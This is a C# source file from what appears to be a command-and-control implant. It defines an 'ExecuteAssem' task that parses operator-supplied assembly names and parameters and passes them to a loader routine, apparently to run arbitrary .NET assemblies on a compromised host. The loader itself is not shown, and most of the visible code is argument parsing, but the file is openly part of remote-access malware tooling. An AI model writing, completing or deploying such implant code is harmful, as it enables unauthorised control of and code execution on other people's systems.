using Implant.Models;
using Implant.Utils;

namespace Implant.Tasks.Execute
{
    class ExecuteAssem : ImplantCommands
    {
        private string assemName { get; set; }
        private string assemParams { get; set; }
        private string Args { get; set; }
        public override string Name => "ExecuteAssem";
        public override string Execute(ImplantTask task)
        {
            var opts = ImplantOptionUtils.ReturnMethod(task);
            Args = task.Args.Replace("\\", "");
            var args = ImplantOptionUtils.ParseArgs(Args);

            foreach (var opt in opts)
            {
                foreach (var _params in args.Params)
                {
                    if ((_params.OptionName.ToLower() is "assemname")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        assemName = _params.OptionValue;
                    }
                    if ((_params.OptionName.ToLower() is "assemparams")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        assemParams = _params.OptionValue;
                    }
                }
            }

            return LoadFunctions.ExecuteAssemEP(assemName, assemParams);
        }    }
}
